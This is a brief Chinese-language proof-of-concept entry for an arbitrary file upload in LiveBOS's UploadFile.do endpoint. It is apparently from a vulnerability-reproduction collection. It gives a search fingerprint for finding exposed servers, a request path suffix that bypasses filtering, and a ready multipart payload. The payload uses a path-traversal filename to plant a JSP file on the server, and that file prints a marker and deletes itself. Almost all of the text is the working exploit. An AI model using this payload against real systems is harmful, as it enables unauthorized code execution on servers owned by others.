# LiveBOSUploadFile.do任意文件上传漏洞复现

LiveBOSUploadFile ｜ 文件上传 ｜ —
- **指纹**：`body="Power by LiveBOS"`
- **请求**：`POST /feed/UploadFile.do;.js.jsp HTTP/1.1`

**Payload**
```
---WebKitFormBoundaryxegqoxxi
Content-Disposition:form-data; name="file"; filename="/../../../../rce.jsp"
Content-Type: image/jpeg
<%@ page import="java.io.File" %>
<%
out.println("pppppppppoooooooocccccccccccc");
String filePath = application.getRealPath(request.getServletPath());
new File(filePath).delete();
%>
---WebKitFormBoundaryxegqoxxi--
```
- **响应特征**：200 上传成功